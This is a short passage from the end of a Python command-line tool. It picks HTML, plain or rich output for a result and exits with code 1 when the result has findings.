        render_html(result, output=args.output or output_path)
    elif fmt == "plain" or not RICH_AVAILABLE:
        render_plain(result)
    else:
        render_rich(result)

    # Exit code: 0 = clean, 1 = findings present
    return 0 if not result.findings else 1


if __name__ == "__main__":
    sys.exit(main())
